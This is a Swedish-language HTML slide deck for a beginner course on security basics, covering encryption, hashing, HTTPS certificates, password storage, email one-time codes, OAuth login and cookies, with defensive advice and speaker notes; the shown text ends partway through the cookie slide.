@@ -1,0 +1,763 @@
+<!doctype html>
+<html lang="sv">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tillfälle 4 · Del 1: Säkerhet</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+  <link rel="stylesheet" href="../assets/theme.css?v=3">
+  <link rel="stylesheet" href="../assets/slides.css?v=13">
+  <script src="../assets/slides.js?v=7" defer></script>
+</head>
+<body>
+<a class="home" href="../index.html">⌂ Kursmaterial</a>
+<div class="deck">
+
+  <!-- 1 -->
+  <section class="title">
+    <div class="kicker">Folkuniversitetet · Tillfälle 4 · Del 1</div>
+    <h1>Lås, nycklar<br>och inloggning</h1>
+    <p class="lead">Grunderna i säkerhet: hur kryptering fungerar, hur man loggar in på riktigt, och hur du gör din webbapp säker.</p>
+    <div class="badge-row">
+      <span class="badge">🔑 Kryptering</span>
+      <span class="badge">🔒 HTTPS</span>
+      <span class="badge">🪪 Inloggning</span>
+      <span class="badge">🛡️ Säkra appar</span>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Ungefär 55 minuter. Inga förkunskaper behövs utöver det vi gjort tillfälle 1 till 3.</li>
+        <li>Målet är inte att deltagarna ska kunna bygga säkerhet själva, utan att de ska förstå orden, kunna ställa rätt krav till agenten och känna igen när något är fel.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <!-- 2 -->
+  <section>
+    <div class="kicker">Idag</div>
+    <h2>Upplägget</h2>
+    <div class="layers wide">
+      <div class="layer l1"><span class="e">🔐</span><b>Del 1 · 55 min</b><span>Kryptering, HTTPS, inloggning och säkra webbappar</span></div>
+      <div class="layer l2"><span class="e">☕</span><b>Paus · 15 min</b><span>Sträck på benen</span></div>
+      <div class="layer l3"><span class="e">🧩</span><b>Del 2 · 60 min</b><span>Fortsättning efter pausen</span></div>
+      <div class="layer l4"><span class="e">🏠</span><b>Hemuppgift · 15 min</b><span>Övningarna du gör efter lektionen, och frågor</span></div>
+    </div>
+  </section>
+
+  <!-- 3 -->
+  <section>
+    <div class="kicker">Varför säkerhet?</div>
+    <h2>Tre saker vi vill skydda</h2>
+    <div class="cards">
+      <div class="card frag"><span class="e">🙈</span><h3>Ingen annan kan läsa</h3><p>Ditt lösenord och dina meddelanden ska bara läsas av den de är till.</p></div>
+      <div class="card frag"><span class="e">✋</span><h3>Ingen kan ändra</h3><p>Det du skickar ska komma fram precis som du skickade det.</p></div>
+      <div class="card hot frag"><span class="e">🪪</span><h3>Vi vet vem du är</h3><p>Servern ska veta att det är du, och inte någon som låtsas vara du.</p></div>
+    </div>
+    <p class="lead frag bottom">Allt idag handlar om en av de här tre.</p>
+    <aside class="notes">
+      <ul>
+        <li>På fackspråk: konfidentialitet, integritet och autenticitet. Orden behövs inte, men de dyker upp om man läser vidare.</li>
+        <li>Koppla till tillfälle 3: ”Lita aldrig på klienten” och ”Publicerar du? Då behövs inloggning”. Idag fyller vi i hur.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <!-- Kryptering -->
+  <section class="divider">
+    <div class="num">1</div>
+    <h2>Kryptering</h2>
+    <p class="lead">Göra text oläslig för alla utom rätt person</p>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Ett hemligt språk med en nyckel</h2>
+    <div class="cols">
+      <div class="cipher">
+        <b>Klartext</b><code>FIKA</code>
+        <b class="frag">Nyckel</b><span class="frag">flytta varje bokstav <strong>3 steg</strong> fram</span>
+        <b class="frag">Chiffertext</b><code class="frag" style="color:var(--berry)">ILND</code>
+      </div>
+      <ul class="nice">
+        <li class="frag"><strong>Kryptera:</strong> gör om klartext till nonsens med hjälp av en nyckel</li>
+        <li class="frag"><strong>Dekryptera:</strong> gör om nonsensen till klartext igen, med nyckeln</li>
+        <li class="frag">Utan nyckeln ska det vara omöjligt att läsa. Själva metoden får alla känna till</li>
+      </ul>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Det här är Caesarchiffret, som Julius Caesar ska ha använt. Det knäcks på några minuter med papper och penna, det finns bara 28 möjliga nycklar.</li>
+        <li>Dagens kryptering bygger på samma idé, men nyckeln är ett tal med ungefär 78 siffror. Alla datorer på jorden skulle inte hinna prova alla nycklar innan solen slocknar.</li>
+        <li>Viktig poäng: hemligheten ligger i nyckeln, inte i metoden. Metoderna är öppna och granskade av forskare.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Symmetrisk: samma nyckel åt båda håll</h2>
+    <div class="flow big" style="justify-content:center">
+      <div class="box sun">👩 Anna<small>”Ses kl 15”</small></div>
+      <div class="arrow frag">🔑</div>
+      <div class="box frag">📦 Låst låda<small>x7#Qa9!pL…</small></div>
+      <div class="arrow frag">🔑</div>
+      <div class="box alt frag">👨 Ali<small>”Ses kl 15”</small></div>
+    </div>
+    <div class="cards two" style="margin-top:36px">
+      <div class="card good frag"><span class="e">⚡</span><h3>Styrka: snabb</h3><p>Klarar enorma mängder data, som en film eller en hel hårddisk.</p></div>
+      <div class="card bad frag"><span class="e">🤝</span><h3>Svaghet: nyckeln</h3><p>Båda måste ha samma nyckel. Hur ger du den till Ali utan att någon ser?</p></div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Som en vanlig dörr: samma nyckel låser och låser upp.</li>
+        <li>Används till exempel när din mobil eller dator krypterar sin hårddisk, i lösenordshanteraren, och för själva trafiken i HTTPS. Vanligast heter AES.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Nyckelproblemet</h2>
+    <div class="flow big" style="justify-content:center">
+      <div class="box sun">👩 Anna<small>har nyckeln</small></div>
+      <div class="arrow">→</div>
+      <div class="box">🌐 Internet<small>café-wifi, routrar,<br>operatörer …</small></div>
+      <div class="arrow">→</div>
+      <div class="box alt">👨 Ali<small>behöver nyckeln</small></div>
+    </div>
+    <p class="lead frag" style="margin-top:40px;text-align:center">🕵️ Eva sitter på caféet och ser allt som skickas. Skickar Anna nyckeln, så har Eva den också.</p>
+    <p class="quote frag" style="margin-top:30px;text-align:center">Hur delar man en hemlighet med någon man <span class="hl">aldrig har träffat</span>?</p>
+    <aside class="notes">
+      <ul>
+        <li>Det här är problemet varje gång du besöker en webbsida för första gången. Du har aldrig träffat servern och har ingen gemensam nyckel.</li>
+        <li>Namnen Alice, Bob och Eve (eavesdropper, tjuvlyssnare) är klassiska inom kryptografi.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Asymmetrisk: ett nyckelpar</h2>
+    <div class="cols">
+      <div class="cards two" style="grid-template-columns:1fr">
+        <div class="card sun"><span class="e">🔓</span><h3>Publik nyckel</h3><p>Som ett öppet hänglås. Ali delar ut hur många som helst. Vem som helst kan klicka igen det.</p></div>
+        <div class="card hot frag"><span class="e">🗝️</span><h3>Privat nyckel</h3><p>Den enda nyckeln som öppnar låset. Lämnar aldrig Alis dator.</p></div>
+      </div>
+      <ul class="nice">
+        <li class="frag">Anna låser sitt meddelande med Alis <strong>publika</strong> nyckel</li>
+        <li class="frag">Eva ser den låsta lådan, men har ingen nyckel som öppnar den</li>
+        <li class="frag">Bara Ali kan öppna, med sin <strong>privata</strong> nyckel</li>
+        <li class="frag">Nyckelproblemet är löst: inget hemligt behöver skickas</li>
+      </ul>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Uppfanns på 1970-talet och är grunden för all säker kommunikation på internet. Kända metoder heter RSA och elliptiska kurvor.</li>
+        <li>Ni har redan stött på det om ni skapat en SSH-nyckel för GitHub: id_ed25519 är den privata, id_ed25519.pub är den publika.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Baklänges: en digital signatur</h2>
+    <div class="flow" style="justify-content:center">
+      <div class="box sun">🗝️ Privat nyckel<small>Ali signerar<br>”Ali skrev detta”</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">📜 Meddelande<small>+ signatur</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">🔓 Publik nyckel<small>alla kan kontrollera<br>att det är äkta</small></div>
+    </div>
+    <ul class="nice" style="margin-top:40px">
+      <li class="frag">Bara den privata nyckeln kan skapa signaturen. Alla kan kontrollera den</li>
+      <li class="frag">Ändrar någon en enda bokstav i meddelandet blir signaturen ogiltig</li>
+      <li class="frag">Används för certifikat i HTTPS, inloggningsbiljetter (JWT) och appar i App Store</li>
+    </ul>
+    <aside class="notes">
+      <ul>
+        <li>Som en namnteckning som inte går att förfalska, och som dessutom låser hela dokumentet.</li>
+        <li>Kryptering handlar om att ingen annan ska kunna läsa. Signering handlar om att ingen ska kunna ändra eller låtsas vara någon annan.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Kryptering</div>
+    <h2>Bäst tillsammans</h2>
+    <table class="rest">
+      <tr><th></th><th>Symmetrisk</th><th>Asymmetrisk</th></tr>
+      <tr class="frag"><td><strong>Nycklar</strong></td><td>En gemensam</td><td>Ett par: publik + privat</td></tr>
+      <tr class="frag"><td><strong>Hastighet</strong></td><td>⚡ Mycket snabb</td><td>🐢 Ungefär tusen gånger långsammare</td></tr>
+      <tr class="frag"><td><strong>Nyckeldelning</strong></td><td>😬 Svårt</td><td>😊 Enkelt, den publika får alla se</td></tr>
+      <tr class="frag"><td><strong>Används till</strong></td><td>Själva datan</td><td>Dela nycklar och signera</td></tr>
+    </table>
+    <p class="lead frag bottom">Tricket: använd den långsamma för att dela en nyckel till den snabba. Det är precis vad <span class="hl">HTTPS</span> gör.</p>
+  </section>
+
+  <!-- Hashning -->
+  <section>
+    <div class="kicker">Hashning</div>
+    <h2>En hash är ett fingeravtryck</h2>
+    <div class="term" style="font-size:19px;flex:none"><div class="bar"><i></i><i></i><i></i></div><pre><span class="c"># SHA-256, den vanligaste hashfunktionen</span>
+<span class="p">kanelbulle</span>  → <span class="ok">a28a4161f72701f5168d2c7e16000b09dc7eb1bfd4c6fb947eeda1f11d07bf92</span>
+<span class="p">Kanelbulle</span>  → <span class="s">0193e191af096da7dede9c6e8c8c11a467a40c4a71a4c4a9ec3066287cc436dc</span>
+<span class="p">hela Bibeln</span> → <span class="t">också 64 tecken</span></pre></div>
+    <ul class="nice" style="margin-top:26px">
+      <li class="frag"><strong>Samma in ger alltid samma ut.</strong> En liten ändring ger ett helt annat resultat</li>
+      <li class="frag"><strong>Alltid lika lång,</strong> oavsett om du hashar ett ord eller en hel film</li>
+      <li class="frag"><strong>Enkelriktad:</strong> det går inte att räkna baklänges från hashen till texten</li>
+    </ul>
+    <aside class="notes">
+      <ul>
+        <li>Som en köttkvarn: det går att göra färs av en biff, men inte en biff av färsen.</li>
+        <li>Visa gärna live: i terminalen på Mac skriver man echo -n kanelbulle | shasum -a 256. Samma hash som på bilden.</li>
+        <li>Skillnaden mot kryptering: kryptering går att låsa upp med en nyckel. En hash har ingen nyckel och går aldrig tillbaka.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Hashning</div>
+    <h2>Vad används hashning till?</h2>
+    <div class="cards">
+      <div class="card frag"><span class="e">🔑</span><h3>Lösenord</h3><p>Servern sparar hashen av ditt lösenord, aldrig lösenordet. Mer om det strax.</p></div>
+      <div class="card frag"><span class="e">📥</span><h3>Kontrollera filer</h3><p>Stämmer hashen på filen du laddade ner med den på hemsidan? Då är den inte ändrad.</p></div>
+      <div class="card frag"><span class="e">🌱</span><h3>Git</h3><p>Varje commit-id, som <code>f214aac</code>, är början på en hash av innehållet.</p></div>
+    </div>
+    <p class="lead frag bottom">Hashen bevisar att något är <span class="hl">oförändrat</span>, utan att avslöja vad det är.</p>
+    <aside class="notes">
+      <ul>
+        <li>Git-kopplingen brukar landa bra: de har sett commit-id:n i git log och i pull requests.</li>
+        <li>Signaturer bygger också på hashning: man signerar hashen av meddelandet, inte hela meddelandet.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Tre ord som blandas ihop</div>
+    <h2>Kryptering, hashning och kodning</h2>
+    <div class="cards">
+      <div class="card frag"><span class="e">🔐</span><h3>Kryptering</h3><p>Hemligt. Går att låsa upp, men bara med rätt nyckel.</p></div>
+      <div class="card frag"><span class="e">🧬</span><h3>Hashning</h3><p>Fingeravtryck. Går aldrig att låsa upp.</p></div>
+      <div class="card hot frag"><span class="e">🔤</span><h3>Kodning</h3><p>Bara ett annat format, till exempel <strong>Base64</strong>. Vem som helst kan läsa det. <strong>Inte</strong> säkerhet.</p></div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Base64 gör om data till vanliga bokstäver och siffror så att det kan skickas som text. Det ser hemligt ut men är det inte. Vi kommer att se det igen i JWT.</li>
+        <li>Ser ni agenten ”skydda” något med Base64, då är det inte skyddat.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <!-- HTTPS -->
+  <section class="divider">
+    <div class="num">2</div>
+    <h2>HTTPS</h2>
+    <p class="lead">Hänglåset i adressfältet</p>
+  </section>
+
+  <section>
+    <div class="kicker">HTTPS</div>
+    <h2>Vykort eller förseglat brev?</h2>
+    <div class="cards two">
+      <div class="card bad"><span class="e">🏞️</span><h3>HTTP: ett vykort</h3><p>Alla som hanterar det på vägen kan läsa och ändra: wifi-nätet på caféet, routrar, operatören.</p></div>
+      <div class="card good frag"><span class="e">✉️</span><h3>HTTPS: ett förseglat brev</h3><p>Samma frågor och svar som förra gången, men krypterade. På vägen syns bara vilken sajt du pratar med.</p></div>
+    </div>
+    <p class="lead frag bottom">Utan HTTPS skickas ditt lösenord i klartext till alla som lyssnar.</p>
+    <aside class="notes">
+      <ul>
+        <li>HTTPS = HTTP + TLS. TLS står för Transport Layer Security och är själva kuvertet. Ibland hör man det äldre namnet SSL.</li>
+        <li>Det vi lärde oss om HTTP förra gången gäller fortfarande: metod, adress, headers, body. HTTPS ändrar inte innehållet, bara att det skickas förseglat.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">HTTPS</div>
+    <h2>Handskakningen, förenklat</h2>
+    <div class="flow even">
+      <div class="box sun">👋 Hej!<small>webbläsaren<br>kontaktar servern</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🪪 Certifikat<small>serverns publika nyckel,<br>signerad av en utfärdare</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🔍 Kontroll<small>är signaturen äkta?<br>rätt adress?</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🤝 Ny nyckel<small>delas med hjälp av<br>asymmetrisk kryptering</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">⚡ Trafiken<small>krypteras symmetriskt<br>med den nya nyckeln</small></div>
+    </div>
+    <p class="lead frag" style="margin-top:44px">Asymmetrisk för att <strong>komma överens</strong>, symmetrisk för att <strong>prata</strong>. Allt på några millisekunder.</p>
+    <aside class="notes">
+      <ul>
+        <li>Här kommer allt ihop: certifikatet är en signatur, nyckeldelningen är asymmetrisk, trafiken är symmetrisk.</li>
+        <li>Varje ny besökare får en egen nyckel. Det som skickas till dig kan inte läsas av en annan besökare på samma sajt.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">HTTPS</div>
+    <h2>Certifikatet: sajtens ID-kort</h2>
+    <div class="cols wide-left">
+      <ul class="nice">
+        <li>Ett certifikat säger: <em>”den här publika nyckeln tillhör ai-kurs.hellman.cloud”</em></li>
+        <li class="frag">Det är signerat av en <strong>certifikatutfärdare</strong>, som Skatteverket för ID-kort. Webbläsaren litar på ett hundratal sådana</li>
+        <li class="frag"><strong>Let’s Encrypt</strong> delar ut certifikat gratis. GitHub Pages, Supabase och Fly.io fixar det åt dig automatiskt</li>
+      </ul>
+      <div class="card hot frag">
+        <span class="e">🎣</span>
+        <h3>Hänglåset ljuger inte, men …</h3>
+        <p>Det betyder att förbindelsen är krypterad. Inte att sajten är snäll. En falsk bank kan också ha HTTPS.</p>
+      </div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Visa live: klicka på hänglåset i webbläsaren på kurssidan och visa certifikatet. Vem är utfärdare, hur länge gäller det?</li>
+        <li>Nätfiske (phishing) använder ofta HTTPS. Kolla alltid adressen, inte bara låset. Lösenordshanteraren hjälper: den fyller bara i på rätt adress.</li>
+        <li>localhost under utveckling kör HTTP, och det är okej, för trafiken lämnar aldrig datorn.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <!-- Inloggning -->
+  <section class="divider">
+    <div class="num">3</div>
+    <h2>Inloggning</h2>
+    <p class="lead">Hur servern vet vem du är</p>
+  </section>
+
+  <section>
+    <div class="kicker">Inloggning</div>
+    <h2>Två frågor som låter lika</h2>
+    <div class="cards two">
+      <div class="card sun frag"><span class="e">🪪</span><h3>Vem är du?</h3><p><strong>Autentisering.</strong> Visa leg i dörren. Misslyckas det svarar servern <code>401</code>.</p></div>
+      <div class="card frag"><span class="e">🎟️</span><h3>Vad får du göra?</h3><p><strong>Auktorisering.</strong> Du är inloggad, men får du radera Annas fika? Om inte: <code>403</code>.</p></div>
+    </div>
+    <p class="lead frag bottom">Inloggning svarar på den första frågan. Din backend måste alltid svara på den andra.</p>
+    <aside class="notes">
+      <ul>
+        <li>Statuskoderna 401 och 403 såg vi förra gången. Nu vet vi vad de betyder.</li>
+        <li>På engelska förkortas det ofta authn och authz, eller bara ”auth” för båda.</li>
+        <li>Row Level Security i Supabase är auktorisering: reglerna bestämmer vilka rader du får se och ändra.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Användarnamn och lösenord</div>
+    <h2>Så fungerar det</h2>
+    <div class="flow even">
+      <div class="box sun">⌨️ Anna skriver<small>e-post och<br>lösenord</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🔒 HTTPS<small>skickas krypterat<br>till servern</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🧬 Hashas<small>servern räknar ut<br>hashen igen</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">⚖️ Jämför<small>samma som den sparade?<br>Välkommen in!</small></div>
+    </div>
+    <table class="dbt frag" style="margin-top:40px">
+      <caption>Tabellen anvandare</caption>
+      <tr><th>epost</th><th>losenord_hash</th></tr>
+      <tr><td>anna@exempel.se</td><td><code style="font-size:15px">06b187f77fcb14322d542fdf7e1fddd45260b6fdd8f2aebf34a1b391516818a7</code></td></tr>
+    </table>
+    <aside class="notes">
+      <ul>
+        <li>Servern vet aldrig ditt lösenord, bara dess fingeravtryck. Läcker databasen får tjuven inte lösenorden direkt.</li>
+        <li>Hashen i tabellen är en äkta SHA-256 av hemligt123, samma funktion som på hashsliden. Nästa slide förklarar varför riktiga appar lägger till salt och använder en långsammare hash.</li>
+        <li>Därför kan ingen seriös tjänst skicka ditt gamla lösenord om du glömt det. Gör de det, sparar de det i klartext.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Användarnamn och lösenord</div>
+    <h2>Att spara lösenord rätt</h2>
+    <ul class="emoji">
+      <li class="frag"><span class="e">🚫</span><span><strong>Aldrig i klartext.</strong> En läcka avslöjar då alla lösenord på en gång</span></li>
+      <li class="frag"><span class="e">🧂</span><span><strong>Salt:</strong> en slumpad text per användare läggs till innan hashningen. Två personer med <code>hemligt123</code> får olika hash</span></li>
+      <li class="frag"><span class="e">🐢</span><span><strong>Långsam hash med flit:</strong> <code>bcrypt</code> eller <code>argon2</code>. Snabbt nog för en inloggning, för långsamt för att gissa miljarder lösenord</span></li>
+      <li class="frag"><span class="e">🧰</span><span><strong>Bäst av allt:</strong> bygg det inte själv. Använd en färdig tjänst, som Supabase Auth</span></li>
+    </ul>
+    <aside class="notes">
+      <ul>
+        <li>Utan salt kan en tjuv slå upp vanliga lösenord i färdiga tabeller med miljontals hashar. Saltet gör de tabellerna värdelösa.</li>
+        <li>SHA-256 är för snabb för lösenord: ett grafikkort kan prova miljarder i sekunden. Därför särskilda långsamma funktioner.</li>
+        <li>Be agenten: ”Använd argon2 eller bcrypt för lösenord, aldrig SHA-256 eller klartext.” Eller ännu hellre: ”Använd Supabase Auth.”</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Användarnamn och lösenord</div>
+    <h2>Problemen med lösenord</h2>
+    <div class="cards tight">
+      <div class="card frag"><span class="e">♻️</span><h3>Återanvändning</h3><p>Läcker en sajt testar tjuvarna samma lösenord överallt.</p></div>
+      <div class="card frag"><span class="e">🤏</span><h3>Svaga lösenord</h3><p><code>123456</code> och <code>sommar2026</code> gissas på sekunder.</p></div>
+      <div class="card frag"><span class="e">🎣</span><h3>Nätfiske</h3><p>En falsk sida lurar dig att skriva in lösenordet själv.</p></div>
+      <div class="card frag"><span class="e">🤔</span><h3>Glömda lösenord</h3><p>Återställs ändå med en länk i mejlen.</p></div>
+      <div class="card frag"><span class="e">🏋️</span><h3>Ansvar för dig</h3><p>Du som bygger appen måste lagra och skydda dem rätt.</p></div>
+      <div class="card hot frag"><span class="e">🧯</span><h3>Plåster</h3><p>Lösenordshanterare och tvåstegsverifiering. Men alla använder inte det.</p></div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Att prova läckta lösenord på andra sajter kallas credential stuffing. Det är det vanligaste sättet konton kapas på.</li>
+        <li>Koppla till tillfälle 1: vi installerade lösenordshanterare och slog på tvåstegsverifiering för GitHub. Det är just de här problemen den löser för dig som användare.</li>
+        <li>Notera ”glömda lösenord”: om mejlen ändå är reservnyckeln, varför inte använda mejlen direkt? Det leder till nästa slide.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Engångskod · OTP</div>
+    <h2>Logga in med en kod i mejlen</h2>
+    <div class="flow even">
+      <div class="box sun">📧 E-post<small>Anna skriver<br>sin adress</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🎲 Servern slumpar<small>en kod, sparar hashen<br>och en utgångstid</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">📨 Resend<small>skickar mejlet<br><strong>482 913</strong></small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">⌨️ Anna skriver<small>in koden</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">✅ Inloggad<small>koden raderas,<br>går inte att använda igen</small></div>
+    </div>
+    <p class="lead frag" style="margin-top:44px">OTP betyder <em>one-time password</em>, engångslösenord. Precis så loggar man in i övning 11, Hushållskassan.</p>
+    <aside class="notes">
+      <ul>
+        <li>En variant är en magisk länk i mejlet i stället för en kod. Samma idé.</li>
+        <li>Koderna i autentiseringsappen i mobilen (tvåstegsverifiering) är också OTP, men räknas fram från en hemlighet och klockan i stället för att skickas.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Engångskod · OTP</div>
+    <h2>Varför bättre? Och vad är haken?</h2>
+    <div class="cards two">
+      <div class="card good">
+        <span class="e">👍</span><h3>Bättre</h3>
+        <p>Inget lösenord att glömma, återanvända eller läcka. Koden gäller i några minuter och bara en gång. Du som utvecklare sparar inga lösenord.</p>
+      </div>
+      <div class="card bad frag">
+        <span class="e">👎</span><h3>Haken</h3>
+        <p>Mejlkontot blir huvudnyckeln. Lite långsammare att logga in. Mejl kan hamna i skräpposten. En falsk sida kan fortfarande be om koden.</p>
+      </div>
+    </div>
+    <p class="lead frag bottom">Måste finnas: <span class="hl">begränsa antalet försök</span>. Sex siffror är bara en miljon möjligheter.</p>
+    <aside class="notes">
+      <ul>
+        <li>Utan spärr kan ett skript prova alla en miljon koder på några minuter. Med fem försök per kod och en kod som gäller i tio minuter är chansen försumbar.</li>
+        <li>Att begränsa hur ofta någon får fråga kallas rate limiting. Be agenten om det uttryckligen.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Federerad inloggning</div>
+    <h2>”Logga in med GitHub”</h2>
+    <div class="flow even">
+      <div class="box sun">🖱️ Klick<small>på knappen<br>i din app</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🐙 GitHub<small>Anna loggar in<br>och godkänner</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🎫 Tillbaka<small>med en<br>engångskod</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🖥️ Backend<small>byter koden mot<br>vem Anna är</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">✅ Inloggad<small>utan något<br>lösenord</small></div>
+    </div>
+    <p class="lead frag" style="margin-top:44px">Som att visa passet: du litar på att staten har kontrollerat vem personen är, och slipper göra det själv.</p>
+    <aside class="notes">
+      <ul>
+        <li>Federerad betyder ungefär ”i förbund”. Din app och Google har en överenskommelse om att Google intygar vem användaren är.</li>
+        <li>”Logga in med Google” och ”Logga in med Apple” fungerar likadant. Ni har gjort det själva: när ni loggade in i Claude Code eller gh via webbläsaren var det samma sorts flöde.</li>
+        <li>Koden byts mot uppgifterna av backenden, med en hemlighet som bara din server har. Därför kan ingen som snappar upp koden använda den.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Federerad inloggning</div>
+    <h2>Vad tekniken heter</h2>
+    <div class="cards two">
+      <div class="card sun"><span class="e">🎟️</span><h3>OAuth 2.0</h3><p>Ger en app <strong>tillåtelse</strong> att göra något åt dig. ”Får appen läsa din kalender?” Svaret är en <em>access token</em>.</p></div>
+      <div class="card frag"><span class="e">🪪</span><h3>OpenID Connect (OIDC)</h3><p>Ett lager ovanpå OAuth för <strong>inloggning</strong>: ”vem är du?”. Svaret är en <em>ID token</em>, en JWT.</p></div>
+    </div>
+    <p class="lead frag bottom">Säger någon ”logga in med OAuth” menar de nästan alltid OAuth + OpenID Connect.</p>
+    <aside class="notes">
+      <ul>
+        <li>Den som intygar vem du är kallas identitetsleverantör, på engelska identity provider eller IdP: Google, GitHub, Apple, Microsoft.</li>
+        <li>På stora företag används ibland SAML i stället, en äldre standard med samma idé. Det är det som gör att man loggar in på alla jobbsystem med samma konto (single sign-on).</li>
+        <li>BankID är också federerad inloggning, svensk variant.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Federerad inloggning</div>
+    <h2>För- och nackdelar</h2>
+    <div class="cards two">
+      <div class="card good">
+        <span class="e">👍</span><h3>Fördelar</h3>
+        <p>Två klick för användaren. Du sparar inga lösenord. Google och GitHub har redan tvåstegsverifiering och upptäcker konstiga inloggningar.</p>
+      </div>
+      <div class="card bad frag">
+        <span class="e">👎</span><h3>Nackdelar</h3>
+        <p>Du är beroende av någon annan: stängs kontot är man utelåst. Google ser var du loggar in. Alla har inte konto, och det är krångligare att sätta upp.</p>
+      </div>
+    </div>
+    <p class="lead frag bottom">Vanligt i praktiken: erbjud federerad inloggning <strong>och</strong> e-post med kod.</p>
+  </section>
+
+  <section>
+    <div class="kicker">Federerad inloggning</div>
+    <h2>Det här behövs i din app</h2>
+    <div class="cols wide-left">
+      <ul class="emoji">
+        <li class="frag"><span class="e">📝</span><span><strong>Registrera appen</strong> hos leverantören, till exempel som OAuth App i GitHubs inställningar</span></li>
+        <li class="frag"><span class="e">🆔</span><span>Du får ett <strong>client ID</strong> (publikt) och en <strong>client secret</strong> (hemlig, i <code>.env</code>)</span></li>
+        <li class="frag"><span class="e">↩️</span><span>En <strong>redirect-adress</strong>: dit användaren skickas tillbaka. Måste stämma exakt</span></li>
+        <li class="frag"><span class="e">🔒</span><span><strong>HTTPS</strong> när appen är publicerad. localhost är undantaget</span></li>
+      </ul>
+      <div class="card sun frag">
+        <span class="e">⚡</span>
+        <h3>Enklast: Supabase Auth</h3>
+        <p>Slå på GitHub eller Google under Authentication. Supabase sköter flödet, du klistrar bara in client ID och secret.</p>
+      </div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Agenten kan skriva all kod, men registreringen hos GitHub eller Google och hemligheten måste du göra själv, precis som med API-nycklarna i tillfälle 2.</li>
+        <li>Supabase Auth har också e-post med kod och vanligt lösenord inbyggt. Det är ofta det enklaste valet för våra appar.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <!-- Säkra webbappar -->
+  <section class="divider">
+    <div class="num">4</div>
+    <h2>Säkra webbappar</h2>
+    <p class="lead">Efter inloggningen</p>
+  </section>
+
+  <section>
+    <div class="kicker">Efter inloggningen</div>
+    <h2>HTTP har inget minne</h2>
+    <div class="flow big" style="justify-content:center">
+      <div class="box sun">✅ Inloggad<small>fråga 1</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box frag">🤷 ”Vem är du?”<small>fråga 2</small></div>
+      <div class="arrow frag">→</div>
+      <div class="box alt frag">🤷 ”Vem är du?”<small>fråga 3</small></div>
+    </div>
+    <ul class="nice" style="margin-top:40px">
+      <li class="frag">Varje HTTP-fråga är fristående. Servern minns inte att du loggade in nyss</li>
+      <li class="frag">Efter inloggningen får webbläsaren därför ett <strong>bevis</strong> som skickas med i varje fråga</li>
+      <li class="frag">Beviset kan vara en <strong>session</strong> eller en <strong>JWT</strong>, och det bärs ofta i en <strong>cookie</strong></li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="kicker">Cookies</div>
+    <h2>En lapp som webbläsaren bär med sig</h2>
+    <div class="http">
+      <div class="http-msg res">
+        <div class="head">Svar efter inloggningen</div>
+        <pre>HTTP/1.1 <span class="ok">200 OK</span>
+<span class="h">Set-Cookie: session=8f3a…c1;
+  HttpOnly; Secure; SameSite=Lax</span></pre>
+      </div>
+      <div class="http-msg frag">
+        <div class="head">Varje fråga därefter</div>
+        <pre><span class="m">GET</span> /api/fikor HTTP/1.1
